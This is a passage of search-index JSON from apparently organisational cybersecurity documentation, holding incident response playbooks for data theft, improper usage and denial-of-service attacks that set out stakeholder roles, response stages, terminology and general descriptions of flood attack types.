","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside companies that supply the company with goods, services, or support; they may also have access to its networks, systems, or data. Among their duties and functions are:  Working in tandem with the company's incident response team to locate and fix security flaws or breaches pertaining to their goods or services.Offering the company help and support as it investigates and handles data theft issues that impact its networks or systems.Honouring contractual commitments and legal mandates pertaining to privacy and data security, including disclosing security breaches, and assisting with incident response.  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify IT Security Analyst: The IT security analyst is instantly contacted to begin incident response preparations upon detection of data theft.  Identification (Identify): Red  Contain the Incident; Isolate Systems: Containment procedures, such as isolating impacted systems to prevent additional unauthorised access, are put in place if the issue is continuing.  Notification (Notif): Violet  Change Credentials; Malware Scan: Changing passwords and running malware scans are two urgent steps that should be taken after a successful isolation to lessen the effect of the occurrence.Review Malicious Activities; Notify Relevant Teams: Malicious activity is found through additional analysis, and teams who need to respond are alerted so that they may plan accordingly.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate: Senior analysts are notified to resolve the issue and the incident is escalated if the impacted systems cannot be isolated.  Eradication (Erad): Light Green  Document Incident; Eradicate: To eliminate any last hazards and return to regular operations, the occurrence is recorded, and eradication procedures are put in place.  Recovery (Recover): Brown  Monitor for Further Activities; Recover: To guarantee the organization's resilience, recovery actions are started and ongoing monitoring for additional activities is carried out.  Post-Incident Actions (Post): Light pink  Continue Monitoring; Post-Incident Review: Continuous observation persists, and a post-event assessment is carried out to appraise the efficacy of the reaction and pinpoint opportunities for enhancement.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#51-preparation","content":" • Objective: Establishing the rules, processes, and resources required to properly handle cases of data theft is the main goal of the preparation phase.  • Activities:  Forming an incident response group with clearly defined duties.Creating processes and strategies for incident response that include escalation routes and communication protocols.Regularly providing incident responders with training and drills to guarantee preparedness.Putting security measures and monitoring systems in place to identify and stop instances of data theft.  • Outcome: A well-equipped company capable of reacting to instances of data theft swiftly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#52-detection","content":" • Objective: Finding signs of illegal access or data theft within the organization's networks and systems is the task of the detection stage.  • Activities:  Keeping an eye out for suspicious activities, such as strange access patterns or unauthorised file transfers, by monitoring system logs and network traffic.Putting in place security information and event management (SIEM) and intrusion detection system (IDS) solutions to find any attacks.Examining abnormalities and alarms to differentiate between harmful and legitimate activity.  • Outcome: Early data theft event identification allows for quick response and mitigation actions.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#53-analysis","content":" • Objective: The investigation and comprehension of the type and extent of the data theft occurrence are the main objectives of the analysis stage.  • Activities:  Gathering information and determining the origin and scope of the data theft through forensic analysis.Examining hacked networks and systems to ascertain the attack strategies and the effects on compromised data.Recognising threat actors' tactics, methods, and procedures (TTPs) and indications of compromise (IOCs).  • Outcome: A thorough comprehension of the data theft occurrence, considering its attribution, consequences, and underlying reasons.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#54-containment","content":" • Objective: To stop more unauthorised access or data exfiltration, the containment step entails reducing the incident's effect and spread.  • Activities:  Separating hacked networks and systems to stop attackers from moving laterally.Putting in place limits and access controls to stop unwanted individuals from accessing private information.Putting harmful files, programmes, or network traffic in quarantine or blocking it to stop further damage.  • Outcome: Successful management of the data theft event, reducing the damage it caused to the systems and data of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#55-eradication","content":" • Objective: The goal of the eradication step is to eradicate any remaining risks or vulnerabilities as well as the attackers' presence from the company's IT infrastructure and networks.  • Activities:  Deleting harmful software and data from hacked computers and returning them to a safe condition.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security rules and practices to fix any flaws or vulnerabilities found.  • Outcome: Eradicating all evidence of the data theft event and reducing vulnerabilities to stop such ones in the future.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#56-recovery","content":" • Objective: Restoring impacted systems and information to regular functioning and carrying on business as usual are the objectives of the recovery stage.  • Activities:  Restoring systems and data backups that were hacked to guarantee data availability and integrity.Rebuilding or reorganising networks and systems to increase security and stop such events.Implementing user education and awareness campaigns to stop data theft in the future.  • Outcome: Complete resumption of operations and services together with more robust security measures to reduce the likelihood of a repeat.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#57-post--incident-review","content":" • Objective: In the post-incident review phase, the organization's reaction to the data theft incident is assessed, and opportunities for improvement and lessons learned are noted.  • Activities:  Carrying out a comprehensive examination of the incident response procedure, considering its advantages, disadvantages, and room for development.Recording best practices and lessons learned to improve incident response skills in the future.Adjusting incident response protocols, guidelines, and security measures considering the review's conclusions.  • Outcome: Constant enhancement of incident response capacities and preparedness for upcoming data theft events.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#6-terminology","content":" Data Theft: The illicit procurement, duplication, or elimination of private or sensitive information from a company's networks or systems. Insider Threat: A security risk brought on by employees of a company who may, whether on deliberately or accidentally, abuse or divulge sensitive information for nefarious or personal benefit. External Attack: An attempt to steal confidential information through a cyberattack carried out by people or organisations not connected to its internal network, such as hackers, cybercriminals, or nation-state enemies. Incident Response: A methodical strategy for dealing with and handling security events, such as data theft incidents, with the objectives of minimising harm, restarting operations, and averting such occurrences. Indicators of Compromise (IOCs): Observable indicators, such as strange network traffic patterns, unauthorised access attempts, or questionable file alterations, that point to the existence of malicious activity or a security breach. Security Controls: Procedures put in place to guard against security risks, such as instances of data theft, and to safeguard networks, systems, and data. Intrusion detection systems (IDS), encryption, access restrictions, and security awareness training are a few examples of security controls. Forensic Analysis: The methodical inspection of digital evidence connected to a security event, such data theft, to collect and examine data for legal or investigative needs, including figuring out the incident's cause and consequences. Vulnerability: Vulnerabilities or weaknesses in networks, apps, or systems that an attacker may use to get unauthorised access, steal information, or interfere with normal operations. Inadequate security measures, incorrect setups, and software defects can all lead to vulnerabilities. ","version":"Next","tagName":"h2"},{"title":"Improper Usage Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#11-overview","content":" Redback Operations is at the forefront of innovation and technological improvement in the always changing field of cybersecurity. But these innovations also bring with them a host of new difficulties, one of which is improper usage instances, which should worry us greatly. These occurrences include a broad spectrum of improper or unauthorised use of Redback's systems, data, or resources. Improper usage incidents pose serious risks to Redback's data security, operational continuity, and industry reputation. These risks can stem from employee error resulting in accidental data exposure, insiders purposefully abusing their access privileges, or malicious actors coordinating sophisticated external attacks.  Redback Operations is a member of its field and understands the value of prompt and efficient incident response procedures in reducing the risks associated with improper usage events. Redback can lessen the impact of these occurrences on its operations and guarantee the security and confidentiality of its data and systems by quickly discovering, evaluating, and mitigating them.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#12-purpose","content":" This incident response plan is meant to give Redback Operations a methodical and all- inclusive way to deal with issues involving improper usage. The playbook seeks to enable Redback to react quickly and forcefully to improper usage issues, minimising their impact on data security, operational continuity, and the company's reputation. It does this by outlining clear principles, protocols, and best practices.  Fundamentally, the playbook is a proactive instrument that strengthens Redback's readiness and resilience to changing cybersecurity threats. Redback can enhance its response efficiency, better manage risks, and preserve the faith and confidence of its stakeholders, partners, and customers by instituting standardised incident response processes and standards. This incident response plan is meant to give Redback Operations a methodical and all inclusive way to deal with issues involving improper usage. The playbook seeks to enable Redback to react quickly and forcefully to improper usage issues, minimising their impact on data security, operational continuity, and the company's reputation. It does this by outlining clear principles, protocols, and best practices.  Fundamentally, the playbook is a proactive instrument that strengthens Redback's readiness and resilience to changing cybersecurity threats. Redback can enhance its response efficiency, better manage risks, and preserve the faith and confidence of its stakeholders, partners, and customers by instituting standardised incident response processes and standards  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#13-attack-definition","content":" At Redback Operations, incidents involving improper usage can take many different forms, each with unique difficulties and consequences for incident response. Insider threats are internal threats that come from staff members abusing their access rights for improper reasons, such as sabotage, personal gain, or other nefarious motive. Insider threats can take many different forms, from unintentional data disclosure from carelessness to intentional acts of sabotage meant to compromise sensitive data or interfere with operations.  However, external attacks are planned by hostile organisations outside of Redback with the intention of compromising systems, stealing data, or interfering with business operations to obtain financial advantage or carry out other evil deeds. Targeting Redback's networks, applications, or infrastructure, these assaults could be sophisticated hacks like malware infections, denial-of-service attacks, or hacking.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#14-scope","content":" This playbook covers all types of inappropriate or unauthorised use of Redback Operations' resources, systems, or data. It is intended to handle cases of improper usage. The playbook offers instructions for handling different kinds of improper usage issues, whether they are the result of malevolent external intent or internal carelessness. This guarantees a well- coordinated and efficient response that is in line with Redback's goals and priorities.  The playbook gives Redback the flexibility and adaptability required to effectively respond to changing threats and challenges by covering a broad range of attack types and situations. The playbook includes practical insights and tactics for managing risks, controlling incidents, and minimising their impact on Redback's operations, ranging from internal threats to external assaults, data breaches, phishing attempts, ransomware outbreaks, and credential theft.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#21-insider-threat","content":" The security and integrity of Redback Operations' data are seriously threatened by insider threats. These threats entail members of the organisation abusing their access rights for improper intent, which may result in data breaches, sabotage, or the unlawful publication of private information. Insider risks might arise from disgruntled employees, careless behaviour, or unintentional activities. As such, they are challenging to identify and prevent in the absence of effective monitoring and reaction processes.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#22-external-attack","content":" External assaults use a variety of strategies and techniques to infiltrate systems, steal data, or interfere with operations in order to target Redback Operations from outside the company. Cybercriminals, nation-state actors, or other hostile organisations may be the source of these assaults if they are attempting to take advantage of holes in Redback's networks, applications, or infrastructure. Advanced cyberattacks, such as phishing, malware infections, or denial-of- service assaults, are frequently used in external attacks with the intention of breaching Redback's defences and taking advantage of flaws for illicit financial gain or other goals.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#23-data-breaches","content":" The security and confidentiality of Redback Operations' data are seriously threatened by data breaches. These instances happen when private or sensitive data is obtained, revealed, or taken without permission, putting Redback at risk of loss of money, legal repercussions, and harm to its reputation. Internal threats, external attacks, and other weaknesses in Redback's systems or procedures can lead to data breaches, which emphasises the significance of strong data protection measures and incident response procedures in reducing the risks and repercussions of such incidents.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Incidents​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#24-phishing-incidents","content":" Phishing attacks use phoney emails, messages, or websites to target Redback Operations' stakeholders and employees with the intention of tricking them into divulging private information, including login passwords or financial information. These assaults can be challenging to identify and stop without the right knowledge and training since they frequently pose as authentic messages from reliable sources. Phishing attacks have the potential to cause financial fraud, data breaches, or unauthorised access to Redback's systems, which emphasises the significance of preventative steps like email filtering and security awareness training in reducing the dangers associated with these occurrences.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#25-ransomware-attacks","content":" The data security and operational continuity of Redback Operations are seriously threatened by ransomware assaults. In order to encrypt data or prevent users from accessing computers, malicious software is deployed in these attacks. The attackers then demand a ransom to unlock the encrypted data or to get access back. Attacks using ransomware have the potential to cause data loss, financial extortion, and operational interruptions. This emphasises the significance of having strong backup and recovery procedures in place, as well as proactive steps to stop and lessen the effects of such situations.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#26-credential-theft","content":" One popular strategy used by attackers to obtain unauthorised access to Redback Operations' systems or networks is credential theft. Phishing attacks, social engineering, and other techniques could be used in these incidents to trick employees or stakeholders into giving over their login credentials or authentication tokens. It is crucial to have robust authentication procedures, user awareness, and monitoring in place to identify and lessen the risks associated with credential theft incidents because, with compromised credentials, attackers can evade authentication mechanisms, obtain privileged access to confidential data, or engage in unauthorised activities within Redback's infrastructure.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#3-stakeholders","content":" The proficient handling and settlement of incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  IT Security Team: Leading the technical efforts to identify, examine, and address issues involving improper usage, Redback Operations' IT Security Team is a vital component of incident response. To stop similar incidents in the future, this team oversees keeping an eye on system and network logs, doing forensic analysis, and putting security controls in place. To ensure a coordinated and efficient reaction to situations of improper usage, they collaborate closely with other relevant parties, thereby reducing the impact on Redback's operations and data protection. Incident Response Team: Members of Redback Operations' cross-functional incident response team come from the IT, security, legal, compliance, and management divisions. This team is in charge of organising incident response activities, liaising with relevant parties, and making crucial choices to contain and address occurrences involving improper usage. They guarantee that Redback's policies, processes, and regulatory requirements are met by incident response operations, promoting a unified and effective response. Legal and Compliance Department: Regarding regulatory compliance and the legal ramifications of occurrences involving inappropriate usage, the Legal and Compliance Department offers supervision and counsel. They minimise legal liabilities and reputational risks for Redback Operations by making sure incident response actions comply with relevant laws, regulations, and contractual commitments. Furthermore, they work in conjunction with outside legal counsel and law enforcement organisations as required to handle the legal ramifications of instances of inappropriate usage and assist Redback in reducing risks and safeguarding its interests. System Administrators: Using their technical know-how and domain experience to restore system integrity and functionality, system administrators, as stewards of organisational systems and networks, have a significant impact on the identification, investigation, and resolution of root access issues. Management: Setting organisational priorities, allocating resources, and spearheading strategic efforts aimed at bolstering the organization's resilience against root access threats are all crucial tasks performed by executive leadership, which includes C-suite executives and senior management. External Consultants: Organisations may hire outside consultants or third-party vendors to supplement their incident response capabilities in situations requiring specific knowledge or resources. These vendors can help with forensic analysis, threat intelligence, and remediation efforts.  ","version":"Next","tagName":"h2"},{"title":"4 Flow Diagram​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  This phase denotes the start of the process of becoming ready to handle situations of inappropriate usage. An incorrect usage occurrence is immediately reported to the incident response team. The colour yellow represents the preparation character of this phase, which focuses on gathering the staff and resources required to handle the situation successfully.  Identification (Identify): Red  Identifying the incorrect usage incidence and containing it quickly are part of the identification step. Actions are done to stop the problem from spreading further and isolate the compromised systems. The important and urgent nature of this stage is shown by the colour red, underscoring the significance of acting quickly to stop more harm.  Notification (Notif): Violet  Stakeholders are informed at this phase, and preliminary mitigating actions are put into place. We take steps like modifying login credentials and running scans to find any illegal activity or access. Malicious activity is also examined, and parties are notified so they may organise a response. The colour violet denotes the incident's notice and first reaction attempts, emphasising the need for quick action and communication to lessen its effects.  Containment (Contain): Sky Blue  At this point, the main goals are to control the situation and stop more harm or illegal entry. Should containment tactics prove effective, more escalation might not be required. But higher management could be alerted for more assistance or a solution if containment proves difficult. The containment attempts to stop the incident's spread and lessen its effects on operations are symbolised by the colour sky blue.  Eradication (Erad): Light Green  The goal of the Eradication step is to restore system integrity and eradicate the incident's underlying cause. Procedures are implemented to eliminate malware, illegal access, and other security risks. Details of the incident are recorded for review and analysis later. The activity of eliminating the event and guaranteeing the security of the organization's systems is symbolised by the light green colour.  Recovery (Recover): Brown  At this point, attempts are being made to get past the event and resume regular business. Recovery operations begin, which might involve patching hacked systems, recovering data from backups, and adding further protection. Continuous observation is carried out to identify any lingering risks or weaknesses. The recovery phase, which aims to reinforce security measures and restore business continuity, is symbolised by the colour brown.  Post-Incident Actions (Post): Light Pink  Conducting post-event activities to assess the response's efficacy and pinpoint areas in need of improvement is the last phase. In addition to doing a post-event evaluation to evaluate the organization's reaction and draw lessons from the occurrence, ongoing monitoring is carried out for instances of improper usage. The post-event efforts focused on introspection, education, and ongoing enhancement of incident response skills are represented by the light pink colour.  ","version":"Next","tagName":"h2"},{"title":"5 Incident Response Stages  ​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#51-preparation","content":" Objective: Establishing in place the guidelines, practices, and tools required to handle instances of inappropriate usage.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting in place security measures and surveillance systems to find and stop instances of unauthorised usage.Outcome: A well-equipped company with the ability to react quickly and efficiently to instances of inappropriate use.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#52-detection","content":" Objective: Recognising warning signs of inappropriate use or illegal access to the systems and resources of the business.Activities:Keeping an eye out for questionable activity, such strange access patterns or illicit data transfers.Using security information and event management (SIEM) and intrusion detection systems (IDS) to find such problems.Separating malicious from genuine activity by analysing anomalies and alarms.Outcome: Rapid reaction and mitigation efforts are made possible by early identification of inappropriate usage situations.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#53-analysis","content":" Objective: Recognising the kind and extent of the incident involving improper usage.**Activities:Gathering information and carrying out forensic investigation to Identify the extent and cause of the improper usage incidence.Examining hacked networks and systems to find attack vectors and how they affect compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs).Outcome: A comprehensive understanding of the improper usage incident, including its causes, effects, and attribution.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#54-containment","content":" Objective: Halting more illegal access or data leaks and lessening the effect and spread of the incident involving improper usage.Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.Putting safety measures and access restrictions in place to stop illegal access to sensitive data.Limiting or preventing harmful data, software, or network flow to stop more damage.Outcome: Efficient handling of the improper usage event, reducing harm to the company's information and infrastructure.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#55-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from the company's networks and IT systems.Activities:Removing illegal software and data and returning hacked computers to a safe configuration.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Removal of all traces of the improper usage incident and reduction of vulnerabilities to prevent future occurrences.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#56-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning.Activities:Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to avert inappropriate usage events in the future.Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#57-post-incident-review","content":" Objective: Assessing the organization's reaction to the issue involving improper usage and determining what worked and what didn't.Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved incident response capacities and preparedness for occurrences involving improper usage in the future.  ","version":"Next","tagName":"h3"},{"title":"6 Terminology​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Improper Usage Incident Response  Playbook#6-terminology","content":" Terminology in incident response encompasses a range of concepts and terms essential for effective communication and understanding within the cybersecurity domain. It provides a common language for incident responders, enabling precise and unambiguous communication during incident response activities.  An essential part of Redback Operations' cybersecurity setup is an intrusion detection system (IDS). IDS keeps an eye on network traffic to look for indications of malicious activity, unauthorised access, or security lapses. Network packets and system logs are analysed by IDS to find anomalies or patterns that point to possible security risks. When an improper usage occurrence occurs, Redback's occurrence Response Team can investigate and take appropriate action based on the alarms generated by IDS. SIEM, or Security Information and Event Management, is essential to Redback's incident response operations. SIEM provides real-time visibility into security incidents by gathering, correlating, and analysing security event data from several sources throughout the IT architecture of the company. SIEM improves Redback's overall security posture and resilience against improper usage incidents by aggregating and correlating security data, making it easier to identify and respond to security threats. Redback uses vulnerability assessment as a preventative strategy to find and fix security flaws in its networks and systems. Redback performs vulnerability assessments to find known vulnerabilities, misconfigurations, or weaknesses that threat actors could exploit through routine scanning and analysis. Redback improves its security defences and lowers the possibility of improper usage situations by prioritising remediation activities according to the severity and impact of vulnerabilities. Redback's cybersecurity defences face a substantial challenge from zero-day vulnerabilities. These vulnerabilities are security holes in software or systems that were previously undiscovered or revealed, making organisations open to abuse by hostile parties. Redback keeps a quick response capability to handle new threats and continually searches for zero-day vulnerabilities. Redback increases its resilience against sophisticated cyber threats and reduces the danger caused by zero-day vulnerabilities by putting proactive measures like threat intelligence sharing and patch management into place. ","version":"Next","tagName":"h2"},{"title":"Denial of Service Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1 Introduction​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#11-overview","content":" Denial of Service (DoS) assaults are a serious threat to the availability and integrity of online services in today's interconnected digital ecosystem. A denial-of-service (DoS) attack attempts to stop a system, network, or service from operating normally by flooding it with excessive amounts of unauthorised traffic or resource requests. These assaults have the potential to cause downtime, monetary losses, reputational harm, and even jeopardise the privacy of private data.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#12-purpose","content":" This Denial of Service (DoS) Incident Response Playbook aims to offer a thorough structure for identifying, preparing, and responding to DoS attacks. This playbook tries to protect vital assets and services from disruptive cyber threats and reduce the effect of DoS incidents on our organization's operations by providing preventive measures, detection methods, response protocols, and recovery plans.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#13-attack-definition","content":" An attempt to bring down a computer or network and prevent its intended users from using it is known as a Denial-of-Service (DoS) attack. DoS attacks achieve this by transmitting information that causes a crash or by overloading the target with traffic. The denial of service or resource to legitimate users, such as employees, members, or account holders, is the result of a denial-of-service attack in both cases.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#14-scope","content":" This playbook includes a thorough method for handling Denial of Service (DoS) attacks in the operating environment and infrastructure of our company. From pre-incident planning and detection to mitigation, recovery, and post-event review, it covers every stage of incident handling. The principles and processes described in this playbook can be applied to mitigate related threats, such as Distributed Denial of Service (DDoS) attacks, even if the primary focus of attack is DoS.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 UDP Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#21-udp-flood","content":" Attackers using UDP floods take use of UDP's intrinsic simplicity—that is, its connectionless nature, in contrast to TCP. Attackers frequently target ports or services as they bombard the target system with a massive volume of UDP packets. When the target's network bandwidth is overloaded or its processing power is depleted by the flood of UDP packets, it stops responding to legitimate traffic. Because UDP does not ensure delivery or order, attackers can fake the IP addresses used to originate their attacks, making it challenging to identify their origins.  ","version":"Next","tagName":"h3"},{"title":"2.2 TCP SYN Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#22-tcp-syn-flood","content":" TCP SYN Flood attacks exploit the Transmission Control Protocol's (TCP) three-way handshake protocol. TCP SYN packets are sent by attackers in large quantities; these packets form the initial stage of a TCP connection. They do not, however, send the last ACK packet to complete the handshake, which leaves the target system with a backlog of partially open connections. As a result, valid users are unable to connect to the server because the target's RAM and connection table entries are depleted.  ","version":"Next","tagName":"h3"},{"title":"2.3 HTTP Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#23-http-flood","content":" The goal of HTTP flood attacks is to overload web servers with many HTTP requests. Attackers can target URLs, forms, or online application functionalities with a large volume of requests by using botnets or other automated methods. HTTP Flood assaults cause the server's performance to deteriorate, rendering it incapable of responding to valid user requests by using up the server's memory, processing power, and network bandwidth. Consequently, there is a disruption in service or downtime 